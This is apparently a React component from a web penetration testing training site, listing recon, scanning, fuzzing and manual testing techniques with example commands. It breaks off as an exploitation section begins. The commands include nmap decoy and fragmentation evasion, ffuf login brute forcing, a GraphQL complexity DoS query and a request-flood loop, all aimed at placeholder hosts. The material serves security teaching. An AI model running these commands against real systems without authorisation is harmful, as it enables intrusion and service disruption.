
import React from 'react';
import { Search, Target, Shield, Zap, FileSearch, Code, Database, Lock, AlertTriangle, BookOpen } from 'lucide-react';
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from '@/components/ui/accordion';
import CodeExample from '@/components/CodeExample';

const TestingTechniquesSection: React.FC = () => {
  return (
    <div className="space-y-8">
      <h2 className="section-title">Web Penetration Testing Techniques</h2>
      
      {/* Reconnaissance Techniques */}
      <div className="card">
        <h3 className="text-2xl font-bold mb-6 flex items-center gap-2">
          <Search className="h-7 w-7 text-cybr-primary" />
          Reconnaissance Techniques
        </h3>
        
        <Accordion type="single" collapsible className="space-y-4">
          <AccordionItem value="osint">
            <AccordionTrigger className="text-lg font-semibold">
              OSINT (Open Source Intelligence) Gathering
            </AccordionTrigger>
            <AccordionContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <h5 className="font-semibold mb-3">Popular OSINT Tools</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li><strong>Google Dorking</strong> - Advanced search operators</li>
                    <li><strong>Shodan</strong> - Internet-connected device search</li>
                    <li><strong>theHarvester</strong> - Email and subdomain gathering</li>
                    <li><strong>Maltego</strong> - Link analysis and data mining</li>
                    <li><strong>Recon-ng</strong> - Full-featured reconnaissance framework</li>
                    <li><strong>SpiderFoot</strong> - Automated OSINT collection</li>
                    <li><strong>FOCA</strong> - Metadata analysis tool</li>
                    <li><strong>Metagoofil</strong> - Document metadata extractor</li>
                    <li><strong>Creepy</strong> - Geolocation OSINT tool</li>
                    <li><strong>Social Mapper</strong> - Social media enumeration</li>
                    <li><strong>Sherlock</strong> - Username hunting across platforms</li>
                    <li><strong>Have I Been Pwned API</strong> - Breach data lookup</li>
                    <li><strong>Censys</strong> - Internet scanning and analysis</li>
                    <li><strong>BuiltWith</strong> - Technology profiler</li>
                    <li><strong>Wayback Machine</strong> - Historical website analysis</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Google Dorking Examples</h5>
                  <CodeExample
                    language="text"
                    title="Advanced Google Search Operators"
                    code={`# Finding login pages
site:example.com inurl:login
site:example.com inurl:admin
site:example.com intitle:"admin panel"

# Finding sensitive files
site:example.com filetype:pdf
site:example.com filetype:sql
site:example.com filetype:log
site:example.com ext:config

# Finding directories
site:example.com intitle:"index of"

# Finding subdomains
site:*.example.com

# Finding exposed databases
inurl:phpmyadmin site:example.com
inurl:adminer site:example.com

# Error messages and debug info
site:example.com "error" | "exception" | "debug"

# Finding backup files
site:example.com ext:bak | ext:backup | ext:old`}
                  />
                </div>
              </div>
              
              <div>
                <h5 className="font-semibold mb-3">Social Media Intelligence Techniques</h5>
                <ul className="list-disc pl-6 space-y-1">
                  <li><strong>Employee Profiling:</strong> LinkedIn, Twitter, Facebook reconnaissance</li>
                  <li><strong>Corporate Information:</strong> Company structure, key personnel</li>
                  <li><strong>Technology Stack:</strong> Job postings revealing tech details</li>
                  <li><strong>Email Pattern Discovery:</strong> firstname.lastname@company.com patterns</li>
                  <li><strong>Physical Security:</strong> Office photos, badge systems, security measures</li>
                </ul>
              </div>
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="subdomain">
            <AccordionTrigger className="text-lg font-semibold">
              Subdomain Enumeration
            </AccordionTrigger>
            <AccordionContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <h5 className="font-semibold mb-3">Enumeration Tools</h5>
                  <ul className="list-disc pl-6 space-y-1">
                    <li><strong>Subfinder</strong> - Fast passive subdomain discovery</li>
                    <li><strong>Amass</strong> - Advanced Attack Surface Mapping</li>
                    <li><strong>Sublist3r</strong> - Python subdomain enumerator</li>
                    <li><strong>Knock</strong> - Subdomain scan with wordlist</li>
                    <li><strong>Subbrute</strong> - DNS brute forcer</li>
                    <li><strong>MassDNS</strong> - High-performance DNS resolver</li>
                    <li><strong>DNSRecon</strong> - DNS enumeration script</li>
                    <li><strong>Fierce</strong> - Domain scanner</li>
                    <li><strong>Aquatone</strong> - Subdomain discovery and screenshot</li>
                    <li><strong>Asset Finder</strong> - Go-based subdomain finder</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Techniques Comparison</h5>
                  <div className="space-y-3">
                    <div className="p-3 bg-cybr-muted/30 rounded">
                      <h6 className="font-semibold text-green-400">Passive Enumeration</h6>
                      <ul className="text-sm mt-1">
                        <li>• Certificate Transparency logs</li>
                        <li>• Search engines and archives</li>
                        <li>• DNS history databases</li>
                        <li>• Third-party APIs</li>
                      </ul>
                    </div>
                    <div className="p-3 bg-cybr-muted/30 rounded">
                      <h6 className="font-semibold text-yellow-400">Active Enumeration</h6>
                      <ul className="text-sm mt-1">
                        <li>• DNS brute forcing</li>
                        <li>• Zone transfers (AXFR)</li>
                        <li>• Reverse DNS lookups</li>
                        <li>• Direct DNS queries</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
              
              <CodeExample
                language="bash"
                title="Subdomain Enumeration Commands"
                code={`# Passive discovery with Subfinder
subfinder -d example.com -all -recursive -o subdomains.txt

# Active enumeration with Amass
amass enum -active -d example.com -brute -w /path/to/wordlist.txt

# DNS brute force with MassDNS
massdns -r resolvers.txt -t A -o S subdomains.txt

# Certificate transparency search
curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value' | sort -u

# Using multiple sources with Amass
amass enum -passive -d example.com -src crtsh,hackertarget,virustotal

# Monitor subdomain changes
amass track -config config.ini -d example.com`}
              />
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="tech-stack">
            <AccordionTrigger className="text-lg font-semibold">
              Technology Stack Identification
            </AccordionTrigger>
            <AccordionContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <h5 className="font-semibold mb-3">Detection Tools</h5>
                  <ul className="list-disc pl-6 space-y-1">
                    <li><strong>Wappalyzer</strong> - Browser extension for tech detection</li>
                    <li><strong>BuiltWith</strong> - Website technology profiler</li>
                    <li><strong>WhatWeb</strong> - Web application fingerprinter</li>
                    <li><strong>Retire.js</strong> - JavaScript library vulnerability scanner</li>
                    <li><strong>Nuclei</strong> - Vulnerability scanner with tech detection</li>
                    <li><strong>httpx</strong> - Fast HTTP probe with tech detection</li>
                    <li><strong>Webanalyze</strong> - Technology stack analyzer</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Manual Analysis Techniques</h5>
                  <ul className="list-disc pl-6 space-y-1">
                    <li><strong>HTTP Headers:</strong> Server, X-Powered-By, X-AspNet-Version</li>
                    <li><strong>HTML Comments:</strong> Generator meta tags, debug info</li>
                    <li><strong>JavaScript Files:</strong> Framework detection, library versions</li>
                    <li><strong>CSS Files:</strong> Framework patterns, theme detection</li>
                    <li><strong>Cookies:</strong> Session management patterns</li>
                    <li><strong>Error Pages:</strong> Stack traces, version information</li>
                  </ul>
                </div>
              </div>
              
              <CodeExample
                language="bash"
                title="Technology Detection Commands"
                code={`# WhatWeb scanning
whatweb -v -a 3 https://example.com

# HTTPx with technology detection
echo "example.com" | httpx -tech-detect -status-code -title

# Nuclei technology detection
nuclei -u https://example.com -tags tech

# Custom header analysis
curl -I https://example.com | grep -E "(Server|X-Powered-By|X-AspNet-Version)"

# JavaScript library detection
curl -s https://example.com | grep -oP '(?<=src=")[^"]*\\.js' | head -10

# CMS detection with CMSeeK
python3 cmseek.py -u https://example.com`}
              />
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="port-scanning">
            <AccordionTrigger className="text-lg font-semibold">
              Port Scanning Strategies
            </AccordionTrigger>
            <AccordionContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div>
                  <h5 className="font-semibold mb-3">Scanning Types</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li><strong>TCP Connect:</strong> Full three-way handshake</li>
                    <li><strong>SYN Scan:</strong> Half-open scanning</li>
                    <li><strong>UDP Scan:</strong> Connectionless protocol scanning</li>
                    <li><strong>ACK Scan:</strong> Firewall rule detection</li>
                    <li><strong>Window Scan:</strong> System type identification</li>
                    <li><strong>Maimon Scan:</strong> Stealth scanning technique</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Evasion Techniques</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li><strong>Fragmentation:</strong> Split packets to avoid detection</li>
                    <li><strong>Timing:</strong> Slow scans to avoid rate limiting</li>
                    <li><strong>Decoys:</strong> Use spoofed source addresses</li>
                    <li><strong>Idle Scan:</strong> Zombie host scanning</li>
                    <li><strong>Source Port:</strong> Use common ports (53, 80)</li>
                    <li><strong>Randomization:</strong> Random scan order</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Advanced Tools</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li><strong>Nmap:</strong> Comprehensive network scanner</li>
                    <li><strong>Masscan:</strong> High-speed port scanner</li>
                    <li><strong>Zmap:</strong> Internet-wide scanning</li>
                    <li><strong>RustScan:</strong> Modern fast port scanner</li>
                    <li><strong>Unicornscan:</strong> Asynchronous scanner</li>
                    <li><strong>Hping3:</strong> Custom packet crafting</li>
                  </ul>
                </div>
              </div>
              
              <CodeExample
                language="bash"
                title="Advanced Port Scanning Commands"
                code={`# Fast SYN scan with service detection
nmap -sS -sV -T4 -p- --min-rate 1000 192.168.1.0/24

# Stealth scan with evasion
nmap -sS -f -D RND:10 -T1 --source-port 53 target.com

# UDP scan for common services
nmap -sU --top-ports 1000 -T4 target.com

# Masscan for high-speed scanning
masscan -p1-65535 10.0.0.0/8 --rate=1000 --output-format grepable

# Service version detection with NSE scripts
nmap -sC -sV -A -T4 -p 80,443,22,21 target.com

# OS fingerprinting
nmap -O --osscan-guess target.com

# Firewall detection and bypass
nmap -sA -T4 target.com
nmap -sN -T4 target.com  # Null scan
nmap -sF -T4 target.com  # FIN scan`}
              />
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="content-discovery">
            <AccordionTrigger className="text-lg font-semibold">
              Content Discovery Techniques
            </AccordionTrigger>
            <AccordionContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <h5 className="font-semibold mb-3">Discovery Tools</h5>
                  <ul className="list-disc pl-6 space-y-1">
                    <li><strong>ffuf</strong> - Fast web fuzzer</li>
                    <li><strong>Gobuster</strong> - Directory/file brute forcer</li>
                    <li><strong>Dirbuster</strong> - OWASP directory brute forcer</li>
                    <li><strong>Wfuzz</strong> - Web application fuzzer</li>
                    <li><strong>Feroxbuster</strong> - Fast content discovery</li>
                    <li><strong>Dirb</strong> - URL brute forcer</li>
                    <li><strong>Dirsearch</strong> - Advanced directory scanner</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Recommended Wordlists</h5>
                  <ul className="list-disc pl-6 space-y-1">
                    <li><strong>SecLists:</strong> Comprehensive wordlist collection</li>
                    <li><strong>DirBuster wordlists:</strong> Built-in OWASP lists</li>
                    <li><strong>Raft:</strong> Research-based wordlists</li>
                    <li><strong>FuzzDB:</strong> Attack pattern database</li>
                    <li><strong>PayloadsAllTheThings:</strong> Custom payloads</li>
                  </ul>
                </div>
              </div>
              
              <CodeExample
                language="bash"
                title="Content Discovery Commands"
                code={`# Fast directory enumeration with ffuf
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://example.com/FUZZ -t 100

# Gobuster directory scan
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt -t 50

# File extension fuzzing
ffuf -w /path/to/wordlist.txt -w /path/to/extensions.txt -u https://example.com/FUZZFUZ2Z

# API endpoint discovery
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u https://example.com/api/FUZZ

# Backup file discovery
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .bak,.backup,.old,.tmp -u https://example.com/FUZZFUZZ2

# Hidden parameter discovery
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u https://example.com/page?FUZZ=test

# Subdirectory recursive scan
feroxbuster -u https://example.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -r

# Configuration file hunting
gobuster dir -u https://example.com -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .config,.conf,.cfg,.ini`}
              />
            </AccordionContent>
          </AccordionItem>
        </Accordion>
      </div>

      {/* Vulnerability Scanning */}
      <div className="card">
        <h3 className="text-2xl font-bold mb-6 flex items-center gap-2">
          <Shield className="h-7 w-7 text-cybr-primary" />
          Vulnerability Scanning
        </h3>
        
        <Accordion type="single" collapsible className="space-y-4">
          <AccordionItem value="automated-tools">
            <AccordionTrigger className="text-lg font-semibold">
              Automated Scanning Tools
            </AccordionTrigger>
            <AccordionContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="space-y-4">
                  <div className="p-4 bg-cybr-muted/30 rounded-lg">
                    <h5 className="font-semibold mb-3 text-cybr-primary">Burp Suite Comparison</h5>
                    <div className="space-y-3">
                      <div>
                        <h6 className="font-semibold text-green-400">Professional Features</h6>
                        <ul className="text-sm space-y-1">
                          <li>• Advanced scanner with custom checks</li>
                          <li>• Burp Collaborator for out-of-band testing</li>
                          <li>• Intruder with unlimited payloads</li>
                          <li>• Extensions and custom plugins</li>
                          <li>• Detailed reporting capabilities</li>
                        </ul>
                      </div>
                      <div>
                        <h6 className="font-semibold text-yellow-400">Community Limitations</h6>
                        <ul className="text-sm space-y-1">
                          <li>• No automated scanner</li>
                          <li>• Limited Intruder functionality</li>
                          <li>• Basic reporting only</li>
                          <li>• No Collaborator server</li>
                        </ul>
                      </div>
                    </div>
                  </div>
                </div>
                
                <div className="space-y-4">
                  <div className="p-4 bg-cybr-muted/30 rounded-lg">
                    <h5 className="font-semibold mb-3 text-cybr-primary">OWASP ZAP Features</h5>
                    <ul className="text-sm space-y-1">
                      <li>• Free and open source</li>
                      <li>• Active and passive scanning</li>
                      <li>• Ajax spider for modern apps</li>
                      <li>• REST API for automation</li>
                      <li>• Docker support for CI/CD</li>
                      <li>• Authentication support</li>
                      <li>• Custom script integration</li>
                    </ul>
                  </div>
                </div>
              </div>
              
              <div>
                <h5 className="font-semibold mb-3">Additional Scanning Tools</h5>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <div>
                    <h6 className="font-semibold mb-2">Web Scanners</h6>
                    <ul className="list-disc pl-6 space-y-1 text-sm">
                      <li><strong>Nikto:</strong> Web server scanner</li>
                      <li><strong>Nuclei:</strong> Fast vulnerability scanner</li>
                      <li><strong>W3af:</strong> Web application attack framework</li>
                    </ul>
                  </div>
                  <div>
                    <h6 className="font-semibold mb-2">Infrastructure</h6>
                    <ul className="list-disc pl-6 space-y-1 text-sm">
                      <li><strong>OpenVAS:</strong> Network vulnerability scanner</li>
                      <li><strong>Nessus:</strong> Commercial vulnerability scanner</li>
                      <li><strong>Qualys:</strong> Cloud-based scanning</li>
                    </ul>
                  </div>
                  <div>
                    <h6 className="font-semibold mb-2">Specialized</h6>
                    <ul className="list-disc pl-6 space-y-1 text-sm">
                      <li><strong>SQLmap:</strong> SQL injection scanner</li>
                      <li><strong>XSStrike:</strong> XSS detection tool</li>
                      <li><strong>SSLyze:</strong> SSL/TLS configuration scanner</li>
                    </ul>
                  </div>
                </div>
              </div>
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="fuzzing">
            <AccordionTrigger className="text-lg font-semibold">
              Advanced Fuzzing Techniques
            </AccordionTrigger>
            <AccordionContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <h5 className="font-semibold mb-3">Fuzzing Types</h5>
                  <div className="space-y-3">
                    <div className="p-3 bg-cybr-muted/30 rounded">
                      <h6 className="font-semibold text-blue-400">Black Box Fuzzing</h6>
                      <ul className="text-sm mt-1">
                        <li>• No source code access</li>
                        <li>• Input/output observation</li>
                        <li>• Pattern-based testing</li>
                      </ul>
                    </div>
                    <div className="p-3 bg-cybr-muted/30 rounded">
                      <h6 className="font-semibold text-green-400">White Box Fuzzing</h6>
                      <ul className="text-sm mt-1">
                        <li>• Full source code access</li>
                        <li>• Code coverage analysis</li>
                        <li>• Targeted testing</li>
                      </ul>
                    </div>
                    <div className="p-3 bg-cybr-muted/30 rounded">
                      <h6 className="font-semibold text-yellow-400">Grey Box Fuzzing</h6>
                      <ul className="text-sm mt-1">
                        <li>• Partial code access</li>
                        <li>• Instrumented testing</li>
                        <li>• Feedback-driven</li>
                      </ul>
                    </div>
                  </div>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Target Parameters</h5>
                  <ul className="list-disc pl-6 space-y-1">
                    <li><strong>GET Parameters:</strong> URL query strings</li>
                    <li><strong>POST Data:</strong> Form submissions, JSON, XML</li>
                    <li><strong>HTTP Headers:</strong> User-Agent, Referer, Custom headers</li>
                    <li><strong>Cookies:</strong> Session tokens, preferences</li>
                    <li><strong>File Uploads:</strong> Filename, content, metadata</li>
                    <li><strong>WebSocket Messages:</strong> Real-time communication</li>
                  </ul>
                </div>
              </div>
              
              <CodeExample
                language="bash"
                title="Advanced Fuzzing Examples"
                code={`# Parameter fuzzing with ffuf
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "https://example.com/search?FUZZ=test" -fs 1234

# POST data fuzzing
ffuf -w payloads.txt -X POST -d "username=admin&password=FUZZ" -u https://example.com/login

# Header fuzzing
ffuf -w /usr/share/seclists/Fuzzing/User-Agents/UserAgents.fuzz.txt -H "User-Agent: FUZZ" -u https://example.com/

# JSON fuzzing with wfuzz
wfuzz -c -z file,/usr/share/seclists/Fuzzing/special-chars.txt -H "Content-Type: application/json" -d '{"search":"FUZZ"}' https://example.com/api/search

# Multi-parameter fuzzing
ffuf -w users.txt:USER -w passwords.txt:PASS -X POST -d "username=USER&password=PASS" -u https://example.com/login

# File upload fuzzing
wfuzz -c -z file,extensions.txt -z file,filenames.txt --data "file=@/path/to/testFUZ2Z.FUZ2Z" https://example.com/upload

# Blind vulnerability detection
ffuf -w payloads.txt -u "https://example.com/page?id=FUZZ" -fr "error|exception" -fs 0`}
              />
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="sast-dast">
            <AccordionTrigger className="text-lg font-semibold">
              Static vs Dynamic Analysis
            </AccordionTrigger>
            <AccordionContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="p-4 bg-cybr-muted/30 rounded-lg">
                  <h5 className="font-semibold mb-3 text-blue-400">SAST (Static Analysis)</h5>
                  <div className="space-y-3">
                    <div>
                      <h6 className="font-semibold mb-2">Popular Tools</h6>
                      <ul className="text-sm space-y-1">
                        <li>• <strong>SonarQube:</strong> Multi-language code quality</li>
                        <li>• <strong>CodeQL:</strong> GitHub's semantic analysis</li>
                        <li>• <strong>Semgrep:</strong> Fast static analysis</li>
                        <li>• <strong>Checkmarx:</strong> Enterprise SAST solution</li>
                        <li>• <strong>Veracode:</strong> Cloud-based scanning</li>
                      </ul>
                    </div>
                    <div>
                      <h6 className="font-semibold mb-2">Advantages</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Early detection in SDLC</li>
                        <li>• Complete code coverage</li>
                        <li>• No runtime environment needed</li>
                        <li>• Finds complex vulnerabilities</li>
                      </ul>
                    </div>
                  </div>
                </div>
                
                <div className="p-4 bg-cybr-muted/30 rounded-lg">
                  <h5 className="font-semibold mb-3 text-green-400">DAST (Dynamic Analysis)</h5>
                  <div className="space-y-3">
                    <div>
                      <h6 className="font-semibold mb-2">Popular Tools</h6>
                      <ul className="text-sm space-y-1">
                        <li>• <strong>OWASP ZAP:</strong> Free dynamic scanner</li>
                        <li>• <strong>Burp Suite:</strong> Professional web testing</li>
                        <li>• <strong>Acunetix:</strong> Automated web scanner</li>
                        <li>• <strong>Rapid7 AppSpider:</strong> Enterprise DAST</li>
                        <li>• <strong>Qualys WAS:</strong> Cloud-based scanning</li>
                      </ul>
                    </div>
                    <div>
                      <h6 className="font-semibold mb-2">Advantages</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Tests running application</li>
                        <li>• Real-world attack simulation</li>
                        <li>• No source code needed</li>
                        <li>• Environment-specific issues</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
              
              <div>
                <h5 className="font-semibold mb-3">Integration Strategies</h5>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <div className="p-3 bg-cybr-muted/30 rounded">
                    <h6 className="font-semibold text-cybr-primary">CI/CD Integration</h6>
                    <ul className="text-sm mt-2 space-y-1">
                      <li>• Jenkins plugins</li>
                      <li>• GitHub Actions</li>
                      <li>• GitLab CI/CD</li>
                      <li>• Azure DevOps</li>
                    </ul>
                  </div>
                  <div className="p-3 bg-cybr-muted/30 rounded">
                    <h6 className="font-semibold text-cybr-primary">Dependency Scanning</h6>
                    <ul className="text-sm mt-2 space-y-1">
                      <li>• npm audit</li>
                      <li>• Snyk</li>
                      <li>• WhiteSource</li>
                      <li>• OWASP Dependency Check</li>
                    </ul>
                  </div>
                  <div className="p-3 bg-cybr-muted/30 rounded">
                    <h6 className="font-semibold text-cybr-primary">Container Security</h6>
                    <ul className="text-sm mt-2 space-y-1">
                      <li>• Trivy</li>
                      <li>• Clair</li>
                      <li>• Twistlock</li>
                      <li>• Aqua Security</li>
                    </ul>
                  </div>
                </div>
              </div>
            </AccordionContent>
          </AccordionItem>
        </Accordion>
      </div>

      {/* Manual Testing */}
      <div className="card">
        <h3 className="text-2xl font-bold mb-6 flex items-center gap-2">
          <Target className="h-7 w-7 text-cybr-primary" />
          Manual Testing Methodologies
        </h3>
        
        <Accordion type="single" collapsible className="space-y-4">
          <AccordionItem value="session-management">
            <AccordionTrigger className="text-lg font-semibold">
              Session Management Testing
            </AccordionTrigger>
            <AccordionContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <h5 className="font-semibold mb-3">Testing Areas</h5>
                  <ul className="list-disc pl-6 space-y-2">
                    <li><strong>Session Token Strength:</strong> Entropy analysis, predictability testing</li>
                    <li><strong>Session Fixation:</strong> Pre-login token persistence</li>
                    <li><strong>Session Timeout:</strong> Idle and absolute timeout testing</li>
                    <li><strong>Concurrent Sessions:</strong> Multiple login handling</li>
                    <li><strong>Cookie Security:</strong> HttpOnly, Secure, SameSite attributes</li>
                    <li><strong>Session Invalidation:</strong> Logout functionality testing</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Common Vulnerabilities</h5>
                  <ul className="list-disc pl-6 space-y-2">
                    <li><strong>Weak Session IDs:</strong> Sequential or predictable tokens</li>
                    <li><strong>Session Hijacking:</strong> Token theft via XSS or network</li>
                    <li><strong>Session Replay:</strong> Token reuse after logout</li>
                    <li><strong>Privilege Escalation:</strong> Session token manipulation</li>
                    <li><strong>Cross-Domain Issues:</strong> Subdomain cookie sharing</li>
                  </ul>
                </div>
              </div>
              
              <CodeExample
                language="bash"
                title="Session Testing Commands"
                code={`# Session token entropy analysis
burp-session-analyzer --url https://example.com/login --samples 1000

# Cookie security check
curl -I https://example.com/dashboard | grep -i "set-cookie"

# Session timeout testing
curl -c cookies.txt -b cookies.txt https://example.com/dashboard
sleep 3600  # Wait for timeout
curl -b cookies.txt https://example.com/dashboard

# Concurrent session testing
curl -c session1.txt -d "user=admin&pass=password" https://example.com/login
curl -c session2.txt -d "user=admin&pass=password" https://example.com/login
curl -b session1.txt https://example.com/dashboard
curl -b session2.txt https://example.com/dashboard`}
              />
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="authentication">
            <AccordionTrigger className="text-lg font-semibold">
              Authentication Testing
            </AccordionTrigger>
            <AccordionContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <h5 className="font-semibold mb-3">Authentication Mechanisms</h5>
                  <ul className="list-disc pl-6 space-y-1">
                    <li><strong>Username/Password:</strong> Traditional credentials</li>
                    <li><strong>Multi-Factor Authentication:</strong> SMS, TOTP, Hardware tokens</li>
                    <li><strong>Biometric Authentication:</strong> Fingerprint, face recognition</li>
                    <li><strong>Certificate-Based:</strong> Client certificates</li>
                    <li><strong>OAuth/OpenID Connect:</strong> Federated authentication</li>
                    <li><strong>SAML:</strong> Enterprise single sign-on</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Testing Checklist</h5>
                  <ul className="list-disc pl-6 space-y-1">
                    <li><strong>Brute Force Protection:</strong> Rate limiting, account lockout</li>
                    <li><strong>Password Policy:</strong> Complexity requirements</li>
                    <li><strong>Credential Enumeration:</strong> Username discovery attacks</li>
                    <li><strong>Default Credentials:</strong> Admin/admin testing</li>
                    <li><strong>Password Reset:</strong> Token security, process bypass</li>
                    <li><strong>Remember Me:</strong> Persistent login security</li>
                  </ul>
                </div>
              </div>
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="authorization">
            <AccordionTrigger className="text-lg font-semibold">
              Authorization Testing
            </AccordionTrigger>
            <AccordionContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div>
                  <h5 className="font-semibold mb-3">Access Control Types</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li><strong>RBAC:</strong> Role-Based Access Control</li>
                    <li><strong>ABAC:</strong> Attribute-Based Access Control</li>
                    <li><strong>DAC:</strong> Discretionary Access Control</li>
                    <li><strong>MAC:</strong> Mandatory Access Control</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Common Flaws</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li><strong>IDOR:</strong> Direct object references</li>
                    <li><strong>Privilege Escalation:</strong> Vertical/horizontal</li>
                    <li><strong>Missing Function Level Access Control</strong></li>
                    <li><strong>Forced Browsing:</strong> URL manipulation</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Testing Methods</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li><strong>Parameter Manipulation:</strong> ID modification</li>
                    <li><strong>Path Traversal:</strong> Directory access</li>
                    <li><strong>HTTP Method Testing:</strong> PUT, DELETE</li>
                    <li><strong>Cookie Manipulation:</strong> Role modification</li>
                  </ul>
                </div>
              </div>
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="business-logic">
            <AccordionTrigger className="text-lg font-semibold">
              Business Logic Testing
            </AccordionTrigger>
            <AccordionContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <h5 className="font-semibold mb-3">Testing Areas</h5>
                  <ul className="list-disc pl-6 space-y-2">
                    <li><strong>Workflow Manipulation:</strong> Step skipping, order changes</li>
                    <li><strong>Race Conditions:</strong> Concurrent request testing</li>
                    <li><strong>Input Validation:</strong> Business rule bypass</li>
                    <li><strong>Economic Logic:</strong> Price manipulation, discounts</li>
                    <li><strong>Time Manipulation:</strong> Date/time dependent functions</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Common Scenarios</h5>
                  <ul className="list-disc pl-6 space-y-2">
                    <li><strong>E-commerce:</strong> Cart manipulation, coupon abuse</li>
                    <li><strong>Banking:</strong> Transaction limits, transfer logic</li>
                    <li><strong>Gaming:</strong> Score manipulation, item duplication</li>
                    <li><strong>Social Media:</strong> Privacy bypass, follower manipulation</li>
                  </ul>
                </div>
              </div>
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="api-testing">
            <AccordionTrigger className="text-lg font-semibold">
              API Security Testing
            </AccordionTrigger>
            <AccordionContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <h5 className="font-semibold mb-3">REST API Testing</h5>
                  <ul className="list-disc pl-6 space-y-1">
                    <li><strong>HTTP Methods:</strong> GET, POST, PUT, DELETE testing</li>
                    <li><strong>Parameter Pollution:</strong> Multiple parameter handling</li>
                    <li><strong>Content Type Attacks:</strong> XML, JSON manipulation</li>
                    <li><strong>Rate Limiting:</strong> DoS prevention testing</li>
                    <li><strong>CORS Policy:</strong> Cross-origin request testing</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">GraphQL Testing</h5>
                  <ul className="list-disc pl-6 space-y-1">
                    <li><strong>Query Complexity:</strong> DoS via complex queries</li>
                    <li><strong>Introspection:</strong> Schema information disclosure</li>
                    <li><strong>Injection Attacks:</strong> SQL injection via GraphQL</li>
                    <li><strong>Authorization:</strong> Field-level access control</li>
                    <li><strong>Batching Attacks:</strong> Multiple queries exploitation</li>
                  </ul>
                </div>
              </div>
              
              <CodeExample
                language="bash"
                title="API Testing Examples"
                code={`# REST API enumeration
curl -X GET https://api.example.com/v1/users/1
curl -X GET https://api.example.com/v1/users/2

# HTTP method testing
curl -X PUT https://api.example.com/v1/users/1 -d '{"role":"admin"}'
curl -X DELETE https://api.example.com/v1/users/1

# GraphQL introspection
curl -X POST https://api.example.com/graphql -d '{"query":"query IntrospectionQuery { __schema { queryType { name } } }"}'

# GraphQL query complexity attack
curl -X POST https://api.example.com/graphql -d '{"query":"query { user(id:1) { posts { comments { user { posts { comments { text } } } } } } }"}'

# API rate limiting test
for i in {1..100}; do curl https://api.example.com/v1/data & done`}
              />
            </AccordionContent>
          </AccordionItem>
        </Accordion>
      </div>

      {/* Exploitation Techniques */}
      <div className="card">
        <h3 className="text-2xl font-bold mb-6 flex items-center gap-2">
          <Zap className="h-7 w-7 text-cybr-primary" />
          Advanced Exploitation Techniques
        </h3>
        
        <Accordion type="single" collapsible className="space-y-4">
          <AccordionItem value="payload-crafting">
            <AccordionTrigger className="text-lg font-semibold">
              Payload Crafting Strategies
